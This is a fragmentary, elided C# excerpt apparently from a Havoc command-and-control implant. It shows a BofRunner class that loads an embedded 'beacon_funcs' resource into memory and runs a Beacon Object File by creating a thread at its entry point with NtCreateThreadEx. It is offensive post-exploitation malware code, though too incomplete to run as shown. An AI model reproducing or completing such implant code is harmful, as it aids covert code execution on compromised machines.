...
namespace HavocImplant.AgentFunctions.BofExec.Internals
{
    class BofRunner
    {
        ...
        public BofRunner(ParsedArgs parsed_args)
        {
            ...
            if (resource_names.Contains("HavocImplant.beacon_funcs"))
            {
                var ms = new MemoryStream();
                Stream resStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("HavocImplant.beacon_funcs");
                resStream.CopyTo(ms);
        ...
        public BofRunnerOutput RunBof(uint timeout)
        {
            ...
            IntPtr hThread = NativeDeclarations.NtCreateThreadEx(IntPtr.Zero, 0, this.entry_point, IntPtr.Zero, 0, IntPtr.Zero);
